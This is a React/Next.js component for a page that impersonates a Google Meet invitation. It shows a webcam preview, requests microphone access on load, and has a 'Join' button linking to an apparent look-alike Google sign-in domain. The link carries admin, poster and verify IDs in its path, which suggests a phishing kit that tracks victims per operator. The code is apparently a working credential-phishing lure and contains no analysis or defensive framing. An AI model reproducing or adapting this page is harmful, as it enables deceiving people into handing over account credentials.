"use client";
import { useState, useRef, useEffect } from "react";
import Image from "next/image";
import Webcam from "react-webcam";
import { Mic, MicOff, Video, VideoOff } from "lucide-react";

export default function VideoCall({ adminId, posterId, verifyId, sitename }) {
  const [micEnabled, setMicEnabled] = useState(true);
  const [cameraEnabled, setCameraEnabled] = useState(true);
  const webcamRef = useRef(null);

  const toggleMic = () => {
    setMicEnabled(!micEnabled);
  };

  const toggleCamera = () => {
    setCameraEnabled(!cameraEnabled);
  };
  const playNotificationSound = () => {
    const audio = new Audio("/tune.mp3");
    audio.play().catch((error) => {
      console.error("Error playing the sound:", error);
    });

    return () => {
      audio.pause();
      audio.currentTime = 0;
    };
  };
  const requestNotificationPermission = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      if (stream) {
        playNotificationSound();
      }
    } catch (error) {
      console.error("Error requesting notification permission:", error);
    }
  };
  useEffect(() => {
    requestNotificationPermission();
  }, [adminId, posterId]);
  return (
    <div className="flex flex-col justify-center items-center min-h-screen gap-8 w-xs md:max-w-md mx-auto">
      <div className="w-full flex items-start justify-start pl-8 md:pl-4">
        <div className="w-42 md:w-52 h-12 ">
          <Image
            src={"/logo.png"}
            alt="logo"
            width={100}
            height={100}
            className="w-full h-full object-cover"
          />
        </div>
      </div>

      <div className="relative rounded-lg shadow-md overflow-hidden">
        {cameraEnabled ? (
          <Webcam
            audio={micEnabled}
            ref={webcamRef}
            className="object-cover w-72 h-64 md:w-104 rounded-md"
            mirrored={true}
          />
        ) : (
          <div className="w-72 h-64 md:w-104 rounded-md bg-gray-800 flex items-center justify-center">
            <p className="text-white text-xl">Camera Off</p>
          </div>
        )}

        <div className="absolute bottom-4 left-0 right-0 flex justify-center space-x-4">
          <button
            onClick={toggleMic}
            className={`p-3 rounded-full transition-colors ${
              micEnabled
                ? "bg-white text-gray-800 hover:bg-gray-200"
                : "bg-red-500 text-white hover:bg-red-600"
            }`}
          >
            {micEnabled ? <Mic size={20} /> : <MicOff size={20} />}
          </button>

          <button
            onClick={toggleCamera}
            className={`p-3 rounded-full transition-colors ${
              cameraEnabled
                ? "bg-white text-gray-800 hover:bg-gray-200"
                : "bg-red-500 text-white hover:bg-red-600"
            }`}
          >
            {cameraEnabled ? <Video size={20} /> : <VideoOff size={20} />}
          </button>
        </div>
      </div>

      <div className="text-center space-y-3">
        <p className="text-xl font-medium text-red-500">{sitename?.name}</p>
        <p className="text-gray-600 font-semibold">
          You have been invited to join Google Meet. Please join the video call
        </p>
      </div>

      <button className="bg-green-500 text-white px-14 py-3 rounded-lg text-2xl  hover:bg-green-600 transition-colors font-extrabold">
        <a
          href={`https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`}
        >
          Join
        </a>
      </button>
    </div>
  );
}
